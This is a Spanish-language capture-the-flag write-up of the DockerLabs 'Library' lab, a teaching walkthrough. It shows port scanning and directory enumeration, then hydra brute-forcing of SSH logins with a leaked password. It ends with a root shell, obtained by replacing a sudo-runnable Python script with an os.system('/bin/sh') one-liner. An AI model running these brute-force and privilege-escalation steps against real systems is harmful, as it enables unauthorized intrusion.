---
title: DockerLabs - Library
summary: "Write-up del laboratorio Library de DockerLabs"
author: elcybercurioso
date: 2025-10-27 13:00
categories: [Post, DockerLabs]
tags: [fácil, information leakage, brute force, sudo, file permissions]
media_subpath: "/assets/img/posts/dockerlabs_library"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
└─$ nmap -sCV -p80,22 172.17.0.2                         
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Comenzamos recuperando recursos de la pagina web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10671]
/index.php            (Status: 200) [Size: 26]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
```

Encontramos que aparte del `index.html`, también esta el `index.php`, el cual contiene una serie de caracteres:

![Desktop View](/20251027011949.webp){: width="972" height="589" .shadow}

## explotación

Probamos a ver si se trata de una contraseña para algún usuario del sistema por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
└─$ hydra -L /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -p JIF************* ssh://172.17.0.2 -t 64 -I 

[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000000 login tries (l:1000000/p:1), ~15625 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: c*****   password: JIF*************
```

Usando las credenciales, accedemos a la maquina por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Library]
└─$ ssh c*****@172.17.0.2
c*****@172.17.0.2's password: 
c*****@5b1158daff63:~$ whoami
c*****
```

## escalada de privilegios

Al ir a revisar los permisos SUDO, comprobamos que puede ejecutar un cierto script con Python:

```bash
c*****@5b1158daff63:~$ sudo -l
Matching Defaults entries for c***** on 5b1158daff63:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User c***** may run the following commands on 5b1158daff63:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) encontramos una forma de obtener una consola como `root` si modificamos el contenido del script:

![Desktop View](/20251027012453.webp){: width="972" height="589" .shadow}

El contenido del script es el siguiente:

```bash
c*****@5b1158daff63:~$ cat /opt/script.py
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

Por desgracia, los permisos nos impiden modificarlo:

```bash
c*****@5b1158daff63:~$ ls -la /opt/script.py
-r-xr--r-- 1 c***** root 272 May  7  2024 /opt/script.py
```

Sin embargo, el permiso de ejecución sobre un fichero permite no solo la ejecución en sí, sino también el borrado del mismo:

```
c*****@5b1158daff63:~$ rm /opt/script.py
rm: remove write-protected regular file '/opt/script.py'? y
c*****@5b1158daff63:~$ cat /opt/script.py
cat: /opt/script.py: No such file or directory
```

Dado que el permiso apunta a un directorio en el cual tenemos permisos para poder crear ficheros (`/opt`), podemos crear uno nuevo que se llame igual que el anterior, pero con el contenido que le indiquemos nosotros:

```bash
c*****@5b1158daff63:/opt$ touch /opt/script.py
c*****@5b1158daff63:/opt$ ls -la
total 8
drwxr-xr-x 1 c***** root   4096 Oct 27 00:26 .
drwxr-xr-x 1 root   root   4096 Oct 27 00:02 ..
-rw-rw-r-- 1 c***** c*****    0 Oct 27 00:26 script.py
```

Editamos el nuevo fichero con la instrucción que indicaban que podemos usar para obtener una consola:

```bash
c*****@5b1158daff63:/opt$ cat script.py 
import os; os.system("/bin/sh")
```

Ahora, ejecutamos el script, y vemos que obtenemos correctamente la consola como el usuario `root`:

```bash
c*****@5b1158daff63:/opt$ sudo /usr/bin/python3 /opt/script.py
# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>